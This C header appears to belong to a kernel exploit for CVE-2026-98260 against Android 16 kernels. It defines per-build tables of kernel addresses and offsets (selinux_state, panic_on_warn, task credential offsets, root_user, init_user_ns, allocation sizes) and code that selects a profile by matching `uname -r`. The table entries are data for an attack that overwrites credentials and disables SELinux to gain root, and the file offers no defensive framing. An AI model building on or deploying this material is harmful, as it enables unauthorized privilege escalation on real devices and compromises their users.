/*
 * CVE-2026-98260 per-build kernel configuration.
 *
 * One file per kernel under timer/kbuilds/, indexed below. Add a kernel with
 * `timer-extract <boot.img> --add`, which writes the profile and registers it.
 * `timer build` prints the profile the running kernel matched.
 */
#ifndef KBUILDS_H
#define KBUILDS_H

#include <stdio.h>
#include <string.h>
#include <sys/utsname.h>

struct kbuild
{
    const char *release; /* exact `uname -r` string */
    unsigned long long static_timer_site; /* do_timer_create+0x94 */
    unsigned long long timer_site_low21;
    unsigned long long copy_process_low21;
    unsigned long long selinux_state;
    unsigned long long panic_on_warn;
    unsigned long long root_user;
    unsigned long long init_user_ns;
    unsigned long long init_ucounts;
    unsigned long long init_groups;
    unsigned long long off_task_cred;
    unsigned long long cred_req;
    unsigned long long cred_alloc;
    unsigned long long timer_alloc;
    unsigned long long task_alloc_bytes;
    unsigned int cred_uid_off;
};

/* --- build includes (timer-extract registers here) --- */
#include "kbuilds/6.12.69-android16-6-g242e1a07f878-ab15865446-4k.h"
#include "kbuilds/6.12.69-android16-6-g5fd39602326e-ab16372235-4k.h"
/* --- end build includes --- */

static const struct kbuild *const kbuild_table[] = {
    /* --- build entries (timer-extract registers here) --- */
    &kbuild_6_12_69_android16_6_g242e1a07f878_ab15865446_4k,
    &kbuild_6_12_69_android16_6_g5fd39602326e_ab16372235_4k,
/* --- end build entries --- */
};

#define KBUILD_COUNT (sizeof(kbuild_table) / sizeof(kbuild_table[0]))

/* Exact `uname -r` match only; NULL when the running kernel is unsupported. */
static const struct kbuild *kbuild_lookup(const char *release)
{
    size_t i;

    if (!release)
        return NULL;
    for (i = 0; i < KBUILD_COUNT; i++)
        if (!strcmp(release, kbuild_table[i]->release))
            return kbuild_table[i];
    return NULL;
}

/* Running kernel's profile; `release` (optional) receives `uname -r`. */
static const struct kbuild *kbuild_current(char *release, size_t len)
{
    struct utsname u;

    if (uname(&u))
        return NULL;
    if (release && len)
        snprintf(release, len, "%s", u.release);
    return kbuild_lookup(u.release);
}

static void kbuild_print_supported(FILE *out)
{
    size_t i;

    for (i = 0; i < KBUILD_COUNT; i++)
        fprintf(out, "    %s\n", kbuild_table[i]->release);
}

static void kbuild_dump(const struct kbuild *b, FILE *out)
{
    fprintf(out, "release            %s\n", b->release);
    fprintf(out, "STATIC_TIMER_SITE  %#llx\n", b->static_timer_site);
    fprintf(out, "TIMER_SITE_LOW21   %#llx\n", b->timer_site_low21);
    fprintf(out, "COPY_PROCESS_LOW21 %#llx\n", b->copy_process_low21);
    fprintf(out, "SELINUX_STATE      %#llx\n", b->selinux_state);
    fprintf(out, "PANIC_ON_WARN      %#llx\n", b->panic_on_warn);
    fprintf(out, "ROOT_USER          %#llx\n", b->root_user);
    fprintf(out, "INIT_USER_NS       %#llx\n", b->init_user_ns);
    fprintf(out, "INIT_UCOUNTS       %#llx\n", b->init_ucounts);
    fprintf(out, "INIT_GROUPS        %#llx\n", b->init_groups);
    fprintf(out, "OFF_TASK_CRED      %#llx\n", b->off_task_cred);
    fprintf(out, "CRED_REQ/ALLOC     %#llx/%#llx\n", b->cred_req, b->cred_alloc);
    fprintf(out, "TIMER_ALLOC        %#llx\n", b->timer_alloc);
    fprintf(out, "TASK_ALLOC_BYTES   %#llx\n", b->task_alloc_bytes);
    fprintf(out, "CRED_UID_OFF       %#x\n", b->cred_uid_off);
}

#endif /* KBUILDS_H */
